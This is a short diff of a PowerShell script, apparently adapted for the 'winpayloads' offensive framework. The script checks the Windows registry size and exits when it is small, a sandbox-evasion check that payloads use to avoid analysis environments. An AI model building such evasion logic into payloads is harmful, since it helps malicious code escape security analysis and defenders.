@@ -5,16 +5,12 @@
 #   Twitter: @arvanaghi
 #	  Edited for use in winpayloads
 
-if ($Args.count -eq 0) {
-  $minRegSizeMB = 55
-} else {
-  $minRegSizeMB = $($args[0])
-}
+$minRegSizeMB = 55
 
 $regSize = GWMI -Class Win32_Registry | Select-Object -Expand CurrentSize
 
 if ($regSize -gt $minRegSizeMB) {
-  continue
+  $a = 1
 } else {
   exit
 }
